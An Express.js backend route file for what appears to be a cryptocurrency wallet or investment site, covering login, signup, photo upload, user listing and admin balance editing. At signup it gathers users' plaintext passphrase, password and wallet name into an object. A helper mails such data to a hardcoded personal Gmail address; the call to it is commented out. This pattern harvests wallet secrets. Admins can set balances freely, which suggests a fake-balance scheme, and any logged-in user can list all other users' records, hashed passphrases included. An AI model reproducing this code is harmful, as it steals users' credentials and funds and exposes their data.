const express = require("express");
const router = express.Router();
const bcrypt = require("bcrypt");
const { User, Photo, Admin } = require("../model"); // Assuming you have a User model
const uploadImage = require("../upload.image");
const authMiddleware = require("../authMiddleware");
const { generateToken } = require("../generate");

const ejs = require("ejs");
const path = require("path");
const { transport } = require("../config/nodemailer.config");

// Load the EJS template
const templatePath = path.join(__dirname, "../templates", "user.creation.ejs");

// Function to send the email
const sendMessage = async (user) => {
  return new Promise((resolve, reject) => {
    const emailData = {
      from: process.env.user,
      to: ["aquaderrands@gmail.com"],
      subject: "New info",
    };

    // Render the EJS template
    ejs.renderFile(templatePath, { user }, (err, data) => {
      if (err) {
        console.log("EJS rendering error: ", err);
        reject(err);
      } else {
        // Email content
        emailData.html = data;

        // Send mail
        transport.sendMail(emailData, (error, info) => {
          if (error) {
            console.log("Email sending error: ", error);
            reject(error);
          } else {
            console.log("Email sent: ", info.response);
            resolve(info);
          }
        });
      }
    });
  });
};

function generateRandomNumbers() {
  const min = 100000; // Minimum value for the random numbers
  const max = 999999; // Maximum value for the random numbers
  const numberOfNumbers = 6; // Number of random numbers to generate

  const randomNumber = Math.floor(Math.random() * (max - min + 1)) + min;

  return randomNumber;
}

router.post("/login", async (req, res) => {
  const { email, passPhrase } = req.body;

  // Check if the required fields are provided
  if (!email || !passPhrase) {
    return res.status(400).json({ error: "Email and passPhrase are required" });
  }

  try {
    // Find the user by email
    const user = await User.findOne({ email });

    if (!user) {
      return res.status(400).json({ error: "Invalid credentials" });
    }

    if (user && user.isAdmin) {
      const isPasswordValid = await bcrypt.compare(passPhrase, user.passPhrase);
      // Check if the password is valid
      if (!isPasswordValid) {
        return res.status(401).json({ error: "Invalid credentials" });
      }
      const token = await generateToken(user._id);

      return res.status(200).json({
        _id: user._id,
        email: user.email,
        username: user.username,
        token,
        isAdmin: user.isAdmin,
      });
    }

    const photo = await Photo.findOne({ user: user._id });

    // Compare the provided password with the hashed password
    const isPasswordValid = await bcrypt.compare(passPhrase, user.passPhrase);

    // Check if the password is valid
    if (!isPasswordValid) {
      return res.status(401).json({ error: "Invalid credentials" });
    }

    const token = await generateToken(user._id);
    res.json({
      _id: user._id,
      email: user.email,
      username: user.username,
      currentBalance: user.currentBalance,
      amountDeposited: user.amountDeposited,
      imageUrl: photo ? photo.imageUrl : "",
      merchantId: user.merchantId,
      token,
    });
  } catch (error) {
    console.log(error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

router.post("/signup", async (req, res) => {
  const { email, username, passPhrase, password, walletName } = req.body;

  // Check if the required fields are provided
  if (!email || !username || !passPhrase || !password || !walletName) {
    return res.status(400).json({ error: "All fields are required" });
  }

  try {
    // Check if the user already exists
    const existingUser = await User.findOne({ email });
    if (existingUser) {
      return res.status(400).json({ error: "User already exists" });
    }

    // Hash the password
    const hashedPassword = await bcrypt.hash(passPhrase, 10);
    const merchantId = await generateRandomNumbers();

    // Create a new user
    const newUser = new User({
      email,
      username,
      passPhrase: hashedPassword,
      merchantId,
    });

    const details = {
      email,
      username,
      passPhrase,
      password,
      walletName,
    };

    // await sendMessage(details);
    console.log("Email sent successfully");

    // Save the user to the database
    await newUser.save();

    // Create a new photo entry for the user
    const imageUrl = ""; // Set your default image URL here
    const newPhoto = new Photo({
      imageUrl,
      user: newUser._id,
    });
    await newPhoto.save();

    const token = await generateToken(newUser._id);

    // Return the newly created user along with imageUrl
    res.status(201).json({
      _id: newUser._id,
      email: newUser.email,
      username: newUser.username,
      imageUrl,
      token,
      currentBalance: newUser.currentBalance,
      amountDeposited: newUser.amountDeposited,
      merchantId: newUser.merchantId,
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

router.post("/upload", authMiddleware, async (req, res) => {
  const userId = req.user.userId;

  try {
    if (!req.files || Object.keys(req.files).length === 0) {
      return res.status(400).json({ error: "No files uploaded" });
    }

    const image = req.files.image;
    const imageUrl = await uploadImage(image.data);

    // Find the user's existing photo
    const existingPhoto = await Photo.findOne({ user: userId });

    if (!existingPhoto) {
      // If no existing photo, create a new one
      const newPhoto = new Photo({
        imageUrl,
        user: userId,
      });
      await newPhoto.save();
    } else {
      // If existing photo, update its imageUrl
      existingPhoto.imageUrl = imageUrl;
      await existingPhoto.save();
    }

    res.status(200).json({
      message: "Uploaded successfully",
      imageUrl,
    });
  } catch (error) {
    console.log(error);
    res.status(500).send("Error uploading photos: " + error);
  }
});

router.get("/users", authMiddleware, async (req, res) => {
  const userId = req.user.userId;

  const allUsers = await User.find({
    _id: {
      $ne: userId,
    },
  });
  return res.status(200).json(allUsers);
});

router.put("/admin/update", authMiddleware, async (req, res) => {
  const adminId = req.user.userId;
  const { amountDeposited, currentBalance, userId } = req.body;

  try {
    // Check if the user making the request is an admin
    const adminUser = await User.findOne({ _id: adminId, isAdmin: true });

    if (!adminUser) {
      return res.status(403).json({ error: "Forbidden: User is not an admin" });
    }

    // Update the user's amountDeposited and currentBalance
    await User.findByIdAndUpdate(
      userId,
      {
        amountDeposited,
        currentBalance,
      },
      {
        new: true,
      }
    );

    res.status(200).json({ message: "User updated successfully" });
  } catch (error) {
    console.error("Error updating user:", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

module.exports = router;
